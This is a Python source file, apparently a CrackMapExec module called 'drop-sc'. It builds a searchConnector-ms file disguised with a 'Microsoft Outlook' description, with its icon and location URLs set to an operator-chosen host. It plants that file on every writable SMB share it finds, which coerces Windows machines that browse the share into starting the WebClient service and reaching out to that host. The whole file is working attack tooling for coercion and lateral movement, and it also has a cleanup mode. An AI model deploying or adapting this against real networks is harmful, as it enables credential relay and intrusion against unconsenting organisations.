import ntpath

class CMEModule:
    '''
        Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.
        https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/
        Module by @zblurx
    '''

    name = 'drop-sc'
    description = 'Drop a searchConnector-ms file on each writable share'
    supported_protocols = ["smb"]
    opsec_safe= False
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            Technique discovered by @DTMSecurity and @domchell to remotely coerce an host to start WebClient service.
            https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/
            Module by @zblurx
            URL         URL in the searchConnector-ms file, default https://rickroll
            CLEANUP     Cleanup (choices: True or False)
            SHARE       Specify a share to target
            FILENAME    Specify the filename used WITHOUT the extension searchConnector-ms (it's automatically added), default is "Documents"
        '''
        self.cleanup = False
        if 'CLEANUP' in module_options:
            self.cleanup = bool(module_options['CLEANUP'])
       
        self.url = 'https://rickroll'
        if 'URL' in module_options:
            self.url = str(module_options['URL'])

        self.sharename = ''
        if 'SHARE' in module_options:
            self.sharename = str(module_options['SHARE'])

        self.filename = 'Documents'
        if 'FILENAME' in module_options:
            self.filename = str(module_options['FILENAME'])

        self.file_path = ntpath.join('\\', '{}.searchConnector-ms'.format(self.filename))
        if not self.cleanup:
            self.scfile_path = '/tmp/{}.searchConnector-ms'.format(self.filename)
            scfile = open(self.scfile_path, 'w')
            scfile.truncate(0)
            scfile.write('<?xml version="1.0" encoding="UTF-8"?>')
            scfile.write('<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">')
            scfile.write('<description>Microsoft Outlook</description>')
            scfile.write('<isSearchOnlyItem>false</isSearchOnlyItem>')
            scfile.write('<includeInStartMenuScope>true</includeInStartMenuScope>')
            scfile.write('<iconReference>{}/0001.ico</iconReference>'.format(self.url))
            scfile.write('<templateInfo>')
            scfile.write('<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>')
            scfile.write('</templateInfo>')
            scfile.write('<simpleLocation>')
            scfile.write('<url>{}</url>'.format(self.url))
            scfile.write('</simpleLocation>')
            scfile.write('</searchConnectorDescription>')
            scfile.close()

    def on_login(self, context, connection):
        shares = connection.shares()
        for share in shares:
            if 'WRITE' in share['access'] and (share['name'] == self.sharename if self.sharename != '' else share['name'] not in ['C$','ADMIN$']):
                context.log.success('Found writable share: {}'.format(share['name']))
                if not self.cleanup:
                    with open(self.scfile_path, 'rb') as scfile:
                        try:
                            connection.conn.putFile(share['name'], self.file_path, scfile.read)
                            context.log.success('Created {}.searchConnector-ms file on the {} share'.format(self.filename, share['name']))
                        except Exception as e:
                            context.log.error('Error writing {}.searchConnector-ms file on the {} share: {}'.format(self.filename, share['name'], e))
                else:
                    try:
                        connection.conn.deleteFile(share['name'], self.file_path)
                        context.log.success('Deleted {}.searchConnector-ms file on the {} share'.format(self.filename, share['name']))
                    except Exception as e:
                        context.log.error('Error deleting {}.searchConnector-ms file on share {}: {}'.format(self.filename, share['name'], e))

